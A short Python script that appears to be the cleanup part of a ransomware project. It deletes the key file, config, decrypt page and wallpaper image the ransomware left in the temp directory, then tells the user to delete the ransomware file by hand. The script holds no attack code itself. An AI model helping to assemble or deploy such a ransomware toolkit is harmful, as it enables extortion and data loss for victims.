import os, platform, pathlib, time, sys

temp = f"C:\\Users\\{os.getenv('USERNAME')}\\AppData\\Local\\Temp\\"

if(platform.system() == "Linux"):
    temp = "/tmp/" 

if(os.path.exists(f"{temp}key.key")):
    os.remove(f"{temp}config.json")
    os.remove(f"{temp}key.key")
    os.remove(f"{pathlib.Path(__file__).parent}/decrypt.html")
    if(platform.system() == "Windows"):
        os.remove(f"{temp}i.jpg")
print("Cleanup complete. Please manualy delete this file and the ransomware file.")    
time.sleep(10)
sys.exit()